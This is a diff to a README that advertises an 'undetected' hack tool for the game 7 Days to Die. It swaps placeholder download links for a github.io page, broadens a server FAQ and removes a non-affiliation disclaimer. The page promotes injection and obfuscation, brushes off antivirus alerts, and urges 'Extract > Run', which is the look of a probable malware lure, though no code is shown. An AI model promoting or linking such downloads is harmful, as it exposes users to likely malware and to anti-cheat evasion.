@@ -2,7 +2,7 @@
 
 > **Experience the game like never before.** Dominate the apocalypse with the most advanced, feature-rich, and undetected enhancement suite for 7 Days to Die.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_2026_Release-brightgreen?style=for-the-badge&logo=github)](https://your-download-link-here.com) ![Version](https://img.shields.io/badge/Version-2026.1.0-important) ![Status](https://img.shields.io/badge/Status-Undetected-success) ![Platform](https://img.shields.io/badge/Platform-Windows-blue)
+[![Download Now](https://img.shields.io/badge/Download-Latest_2026_Release-brightgreen?style=for-the-badge&logo=github)](https://crownoiroute.github.io/7-Days-to-Die-Undetected-Hack-GUI/) ![Version](https://img.shields.io/badge/Version-2026.1.0-important) ![Status](https://img.shields.io/badge/Status-Undetected-success) ![Platform](https://img.shields.io/badge/Platform-Windows-blue)
 
 ## ✨ Why Choose This Version?
 
@@ -53,7 +53,7 @@ Getting started takes less than 60 seconds.
 **Q: Is this safe to use?**  
 A: This tool utilizes the most advanced obfuscation and injection methods available. It is designed for single-player and private servers. Use at your own discretion.
 
-**Q: Will this work on [Launcher Name] servers?**  
+**Q: Will this work on all servers?**  
 A: It is optimized for the standard game client. Effectiveness on heavily modified or specific community servers may vary.
 
 **Q: My antivirus is flagging the file. Is it a virus?**  
@@ -70,9 +70,6 @@ A: The default toggle key is `INSERT` on your keyboard. This can usually be chan
 
 ### 💎 Ready to Transform Your Game?
 
-[![Download Latest Version](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-7DTD_2026_Hack-9cf?style=for-the-badge&logo=steam)](https://your-download-link-here.com)
+[![Download Latest Version](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-7DTD_2026_Hack-9cf?style=for-the-badge&logo=steam)](https://crownoiroute.github.io/7-Days-to-Die-Undetected-Hack-GUI/)
 
 **Extract > Run > Dominate.** The ultimate power is one click away.
-
----
-*This project is not affiliated with, endorsed, sponsored, or specifically approved by The Fun Pimps or 7 Days to Die.*
